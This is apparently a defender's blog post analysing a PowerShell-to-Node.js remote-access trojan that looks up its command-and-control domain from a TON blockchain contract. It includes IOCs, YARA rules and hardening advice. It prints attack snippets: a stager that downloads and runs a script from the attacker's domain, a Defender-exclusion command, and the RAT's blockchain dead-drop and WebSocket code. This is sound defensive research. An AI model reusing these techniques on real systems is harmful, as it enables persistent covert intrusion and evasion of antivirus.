---
title: "Bring Your Own Node: a PowerShell stager, a blockchain dead-drop, and a RAT that runs on the real Node.js"
date: 2026-05-30 09:00:00 +1000
categories: [Malware Analysis]
tags: [powershell, nodejs, javascript, lolbin, blockchain, c2, dead-drop-resolver, application-control, persistence, defense-evasion]
description: "A PowerShell stager drops the legitimate Node.js runtime, runs a JavaScript RAT under it, and resolves its C2 domain from a TON blockchain smart contract."
---

*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **TL;DR**
>
> A PowerShell one-liner downloads the **legitimate Node.js runtime** into `%LOCALAPPDATA%`, then runs a JavaScript RAT under it - and asks a **smart contract on the TON blockchain** for its current C2 domain so the operator can rotate it without re-infection. The malice is in the combination (signed runtime + user-writable path + blockchain dead-drop), not in any single exotic component.
>
> **If this is your fleet, do these first:**
>
> - **Application Control over user-writable paths** (E8 ML1). Stops `node.exe` (or any interpreter) from executing out of `%LOCALAPPDATA%` / `%TEMP%`. Single highest-value control here.
> - **PowerShell Script Block Logging (Event ID 4104).** Captures the cleartext loader body even though the stager hides behind big-integer arithmetic.
> - **Alert on `Add-MpPreference -ExclusionProcess`.** A process adding itself to Defender's exclusion list is about as clean a malicious signal as you'll find.
>
> Full IOCs and YARA rules at the bottom.
{: .prompt-tip }

---

A single PowerShell one-liner landed in my lap this morning - run interactively under the user's own shell, which is the command-line shape you tend to see when a ClickFix-style copy-paste lure has done its job (the originating lure page itself wasn't captured here, but the execution pattern is consistent). You know the shape: a wall of `powershell.exe -ep bypass -c`, then some maths, then nothing you can read. The kind of thing that's *supposed* to make you glaze over and move on.

I didn't move on. Three stages later I was looking at a full remote-access trojan written in JavaScript, running under a pristine copy of the **real Node.js runtime** that the malware politely downloads for itself, taking its command-and-control address from a **smart contract on the TON blockchain**. That last part is the bit that made me sit up. It's a genuinely clever way to keep a C2 channel alive, and it's worth understanding before it shows up in your environment instead of mine.

So let's dig in. I'll walk the chain end to end, show the load-bearing code, and - the part that actually matters - turn each trick into something you can implement, harden, or hunt for on Monday.

## The attack at a glance

The whole thing is a relay race, each stage existing only to hand off to the next:

1. **PowerShell stager** - obfuscated with big-integer arithmetic; decodes to a single domain, `superlork[.]info`.
2. **Download** - pulls a second PowerShell script to `%TEMP%\kcngo.ps1` and runs it.
3. **AES loader** - hides its windows, downloads the *legitimate* Node.js v24 runtime, and AES-decrypts a JavaScript payload to disk.
4. **Node.js RAT** - resolves its C2 domain from a **TON blockchain smart contract**, connects over an encrypted WebSocket, and waits for orders.
5. **Objective** - arbitrary code execution, download-and-run of further executables (with a Microsoft Defender exclusion added first), and Run-key persistence.

## How it works

### Stage 0 - maths as obfuscation

The first stage doesn't bother with Base64 or hex. It does *arithmetic*. Two enormous numbers get cast to `[bigint]`, subtracted, and the result is read out one byte at a time in base-256 - each remainder becomes a character.

```powershell
$a = [bigint]"6611243874366085913608060076836463"
$b = [bigint]"4351780965276793220865178706628860"
$d = $a - $b
for ($r = 256; $d -ne 0; $d = $d / $r) { $url += [char]([int]($d % $r)) }
# $url -> "superlork[.]info"
iwr $url -OutFile $env:TEMP\kcngo.ps1 -UseBasicParsing
powershell -ep bypass -File $env:TEMP\kcngo.ps1
```

No alphabet soup for a signature to latch onto - just numbers. It's a small trick but an effective one against naive string-matching.

### Stage 1 - the loader brings its own interpreter

This is where the tradecraft gets interesting. The second-stage PowerShell script (`kcngo.ps1`) does four things before it ever touches a payload.

First, it **hides itself**, walking up the parent-process chain calling `ShowWindow(handle, 0)` until it reaches `explorer.exe` - no flashing console windows for the user to notice.

Then it checks a **mutex** (`Global\0be276c4-7dfb-4d5f-a8e2-fd7c5735c489`) so only one copy runs, and bails if `node.exe` is already going.

Then - and this is the clever bit - it downloads the **genuine, signed Node.js runtime** straight from `nodejs.org`:

```powershell
$home = "$env:USERPROFILE\AppData\Local\Nodejs"
$node = "$home\node-v24.13.0-win-x64\node.exe"
if (-not (Test-Path $node)) {
    iwr "https://nodejs.org/dist/v24.13.0/node-v24.13.0-win-x64.zip" -OutFile "$home\node.zip"
    Expand-Archive "$home\node.zip" $home -Force
}
```

Think about what that buys the attacker. They don't need to write a native dropper, and they don't need to smuggle a suspicious binary past your defences - `node.exe` is a Microsoft-signed-adjacent, perfectly legitimate developer tool. It just happens to be a fully capable script interpreter that most application-control policies and most analysts wave straight through. It's a "bring your own LOLBin" move, and it sidesteps every PowerShell control you've carefully configured by simply... not using PowerShell for the real work.

Finally, the loader AES-decrypts the actual payload - AES-256-CBC, `RijndaelManaged`, with a hardcoded key and IV right there in the script - writes it to `Ii2LW7rMXWB.js`, and launches it hidden:

```text
node.exe  Ii2LW7rMXWB.js  superlork[.]info   (window hidden)
```

### Stage 2 - the RAT, and a blockchain phone book

The payload is ~320 KB of JavaScript, obfuscated twice over: an [obfuscator.io](https://obfuscator.io) string-array layer wrapped around a custom **bytecode virtual machine** (the method bodies are virtualised - each one dispatches into an interpreter rather than running readable code). I'll spare you the deobfuscation war story; the short version is that the VM keeps its string constants in clear text, so the behaviour falls out even without fully unwinding the interpreter.

And the behaviour is a textbook RAT with one standout feature. Before it phones home, it asks **the TON blockchain** where home is:

```javascript
// Ask a TON smart contract for the current C2 domain
const r = await fetch(
  "https://tonapi.io/v2/blockchain/accounts/" +
  "0:c66119f0e5635c4380441d7a79baf0c02a0ab7ea6cd78de06507fc5dc2c1a5d9" +
  "/methods/get_domain");
const domain = (await r.json()).decoded.domain;
const ws = new WebSocket("wss://" + domain + "/w");
```

That contract address is **immutable and operator-controlled**. If you take down `superlork[.]info`, the operator just updates the value the contract returns, and every implant in the field picks up the new address on its next call - no new build, no re-infection. It's a dead-drop resolver, except the "drop" is a public blockchain that nobody's going to take offline for them. Annoyingly elegant.

Once connected, it does a real key exchange - ECDH on `secp256k1`, run the shared secret through HKDF-SHA256 to derive an AES-256-CBC key and IV - so the WebSocket traffic is encrypted with a per-session key. Then it fingerprints the host (hostname, username, MAC, and the `MachineGuid` from the registry, hashed into a bot ID) and waits for commands. The interesting ones:

- **`Function` / `code`** - runs attacker-supplied JavaScript via `new Function(code)`. Arbitrary code execution, on demand.
- **`downloadAndRun`** - fetches a file, checks it's a real PE (`MZ`/`PE\0\0`), and runs it - but first:

```powershell
Add-MpPreference -ExclusionProcess "<dropped>.exe"
```

It adds its own next-stage executable to Microsoft Defender's exclusion list before launching it. Cheeky, and it only works if the malware is running with enough privilege - which is exactly why least privilege matters (more on that below).

Persistence is a plain `HKCU\...\CurrentVersion\Run` value that re-launches the Node script via `node -e "...spawn(...).unref()"` at logon. Nothing fancy, but it doesn't need to be.

## Techniques observed (MITRE ATT&CK)

*The following techniques have been mapped to MITRE ATT&CK for future reference.*

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Execution | PowerShell | T1059.001 | Big-integer-obfuscated stager + AES loader |
| Defense Evasion | Deobfuscate/decode | T1140 | Arithmetic + AES + double-obfuscated JS |
| Execution | JavaScript (Node.js) | T1059.007 | RAT runs under attacker-downloaded Node.js |
| Command & Control | Ingress tool transfer | T1105 | Stage-2 download; Node runtime; `downloadAndRun` |
| Command & Control | Web protocols (WebSocket) | T1071.001 | `wss://<domain>/w`, ECDH + AES-256 encrypted |
| Command & Control | Dead-drop resolver | T1568.003 | C2 domain fetched from a TON smart contract |
| Defense Evasion | Impair defenses | T1562.001 | `Add-MpPreference -ExclusionProcess` |
| Persistence | Registry Run key | T1547.001 | `node -e "...spawn..."` at logon |
| Defense Evasion | Hide window | T1564.003 | `ShowWindow(...,0)` up to explorer |
| Discovery | System info | T1082 / T1033 | hostname, user, MAC, `MachineGuid` -> bot ID |

## Why this matters

Strip away the blockchain novelty and this is a full foothold: an attacker who can run any code they like on the host, drop and execute further tooling, survive a reboot, and re-find their C2 even after you've burned the domain. From here it's whatever they want - credential theft, lateral movement, ransomware staging, or quietly selling the access on.

The detail worth internalising is *how ordinary the building blocks are*. A signed runtime. A user-writable folder. A registry value any user can set. A public API. None of it trips a "malware downloaded" alarm on its own. The malice is in the **combination and the location**, not in any single exotic component - which is exactly the kind of threat that behaviour- and policy-based defences catch and signature-based ones miss.

## What defenders can do

If this were my environment, here's where I'd spend the effort - roughly in priority order.

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|-----------|-----------------|------------------|
| Node.js / script exec from user paths (T1059.007, T1105) | Application control over user-writable dirs | Application Control (ML1+) | `node.exe` running from `%LOCALAPPDATA%`; 4688 |
| PowerShell stager/loader (T1059.001, T1140) | Constrained Language Mode; block `.ps1` from user paths | Application Control; User Application Hardening | Script Block Logging **4104** (decoded body) |
| Run-key persistence (T1547.001) | Baseline autoruns; least privilege | Application Control; Restrict Admin | Sysmon **13** on `...\Run`; `node -e` value |
| Defender exclusion (T1562.001) | Tamper Protection; alert on exclusion changes | Restrict Admin Privileges; User App Hardening | `Add-MpPreference`; Defender cfg-change events |
| WebSocket / blockchain C2 (T1071.001, T1568.003) | Default-deny egress; DNS/proxy filtering | No clean E8 home - network architecture | `tonapi.io` calls + `wss://*/w` from `node.exe` |

**Application control is the single highest-value control here, and it's worth being precise about why.** The whole stage-1 trick is to run the real payload under an interpreter dropped into `%LOCALAPPDATA%` - a user-writable folder, no admin rights required. ASD's *Essential Eight Maturity Model* (November 2023) puts this squarely at **Maturity Level One**, which states that *"application control is applied to user profiles and temporary folders used by operating systems, web browsers and email clients,"* and that it *"restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets to an organisation-approved set."* A policy that actually enforces that stops a freshly-downloaded `node.exe` from executing out of a user profile, full stop - and it does so without caring how the JavaScript was obfuscated. See *Implementing Application Control* (Nov 2023) for the build-out. If prevention slips, hunt **Event ID 4688** for `node.exe` (or any interpreter) launching from under `%LOCALAPPDATA%` / `%TEMP%`.

**Lock down PowerShell while you're there.** Constrained Language Mode neuters the .NET surface these loaders lean on - `[Convert]::FromBase64String`, `System.IO.File`, `RijndaelManaged`. Pair it with **Script Block Logging (Event ID 4104)**, which records the *decoded* script body regardless of the arithmetic or AES wrapping on disk - so even this stager shows up in clear text in your logs (see *Securing PowerShell in the Enterprise*, Oct 2021).

**Treat Defender exclusion changes as alerts, not noise.** `Add-MpPreference -ExclusionProcess` is a self-inflicted blind spot, and a process adding *itself* to the exclusion list is about as clean a malicious signal as you'll find. Turn on **Tamper Protection**, restrict who can modify AV config (this is Restrict Administrative Privileges territory), and alert on any exclusion-list change. This trick also fails outright if the malware isn't running as admin - another vote for least privilege.

**Baseline your Run keys and watch egress.** A `Run` value invoking `node -e "...spawn..."` is not something a legitimate installer writes - Sysmon **Event ID 13** on `...\CurrentVersion\Run` catches it. The C2 has no clean Essential Eight home (it never does - this is network architecture, not an E8 control), so lean on default-deny egress and DNS/proxy filtering: outbound calls to `tonapi.io` from a non-developer host, followed by a long-lived `wss://` connection from `node.exe`, is a hunt worth saving.

## Hunting / detection summary

- **Event ID 4688** - `node.exe` launched from `%LOCALAPPDATA%` or `%TEMP%`; `powershell.exe -ep bypass`.
- **Event ID 4104** (Script Block Logging) - decoded big-integer/AES loader bodies; `ShowWindow`, `RijndaelManaged`, `Expand-Archive` of a Node zip.
- **Sysmon Event ID 13** - writes to `HKCU\...\CurrentVersion\Run` with a `node -e` command line.
- **Defender config events** - any `Add-MpPreference -ExclusionProcess`; exclusion-list changes generally.
- **Network** - outbound to `tonapi.io/v2/blockchain/accounts/.../methods/get_domain`; `wss://*/w` connections originating from `node.exe`; traffic to `superlork[.]info`.
- **Files** - existence of `%LOCALAPPDATA%\Nodejs\Ii2LW7rMXWB.js` or any `node.exe` under `%LOCALAPPDATA%`.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| Domain | `superlork[.]info` | Stage-1 host + WebSocket C2 |
| URL | `hxxp://superlork[.]info/` | Stage-2 download |
| WebSocket | `wss://superlork[.]info/w` | Encrypted RAT channel |
| TON contract | `0:c66119f0e5635c4380441d7a79baf0c02a0ab7ea6cd78de06507fc5dc2c1a5d9` | Dead-drop C2 resolver (strongest pivot) |
| Resolver API | `https://tonapi.io/v2/blockchain/accounts/<acct>/methods/get_domain` | Abused legit TON API |
| SHA256 | `f50ebfff5370025b933ced98def534bdce4e27cbbf15dde3e4b79a85944b554e` | Stage 1 (`kcngo.ps1`) |
| SHA256 | `da24e09777bacc92e5deafb80c446c23810c450871a295166cd54df541e9bf6d` | Stage 2 (`Ii2LW7rMXWB.js`) |
| File | `%LOCALAPPDATA%\Nodejs\Ii2LW7rMXWB.js` | Node.js RAT |
| File | `%TEMP%\kcngo.ps1` | Stage 1 |
| Mutex | `Global\0be276c4-7dfb-4d5f-a8e2-fd7c5735c489` | Single-instance guard |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> `node -e "...spawn(...Ii2LW7rMXWB.js...)"` | Persistence |
| AES key (B64) | `AIwc5o4UeuzKdS6kc7r4W2FO0701tRZ3BU9l7Bs3H7g=` | Loader key |
| AES IV (B64) | `PYfVrK8YuZ6ih6lqI+04ag==` | Loader IV |

## Detection rules

```yara
rule TON_C2_NodeJS_RAT_Loader
{
    meta:
        description = "PowerShell AES loader for superlork[.]info Node.js RAT (TON-blockchain C2)"
        author = "Luke Wilkinson"
        date = "2026-05-30"
    strings:
        $a = "RijndaelManaged" ascii nocase
        $b = "\\Nodejs" ascii
        $c = "node-v24.13.0-win-x64" ascii
        $d = "AIwc5o4UeuzKdS6kc7r4W2FO0701tRZ3BU9l7Bs3H7g=" ascii
        $e = "ShowWindow" ascii
    condition:
        3 of them
}

rule TON_C2_NodeJS_RAT_Payload
{
    meta:
        description = "Node.js RAT using TON get_domain dead-drop + ECDH/AES WebSocket C2"
        author = "Luke Wilkinson"
        date = "2026-05-30"
    strings:
        $ton   = "/methods/get_domain" ascii
        $acct  = "c66119f0e5635c4380441d7a79baf0c02a0ab7ea6cd78de06507fc5dc2c1a5d9" ascii
        $alpha = "gXldcExbCIjweVsOF0PK1N2iQkpBmfuH/oYWS9atJ6nZqh38MRGy+T5zD74LArUv" ascii
        $mpref = "Add-MpPreference -ExclusionProcess" ascii
        $hs    = "completeHandshake" ascii
    condition:
        2 of them
}
```

## Closing

The headline trick here is the blockchain dead-drop, and it deserves the attention - you can't take down a domain resolver that lives on a public chain. But if you only fix one thing after reading this, make it application control over user-writable folders. Every bit of this attack's cleverness routes through one assumption: that a brand-new `node.exe` sitting in `%LOCALAPPDATA%` will be allowed to run. Take that assumption away and the whole relay race stops at the first handoff.

This one was a genuine pleasure to pull apart - three honest layers, each one teaching you something. Stay curious, and go check what's allowed to execute out of your users' profiles.

---

*On methodology: the investigation is mine. The reverse engineering and analysis assembly were carried out with AI workflows (Claude, primarily). I reviewed every finding. Errors are mine - ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam) if you spot something off.*

## References

- MITRE ATT&CK: [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1059.007](https://attack.mitre.org/techniques/T1059/007/), [T1568.003](https://attack.mitre.org/techniques/T1568/003/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/), [T1547.001](https://attack.mitre.org/techniques/T1547/001/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1140](https://attack.mitre.org/techniques/T1140/), [T1564.003](https://attack.mitre.org/techniques/T1564/003/), [T1082](https://attack.mitre.org/techniques/T1082/)
- ASD/ACSC: *Essential Eight Maturity Model* (November 2023), *Implementing Application Control* (November 2023), *Securing PowerShell in the Enterprise* (October 2021)
- TON documentation: [smart contract `get` methods](https://docs.ton.org/develop/smart-contracts/messages)
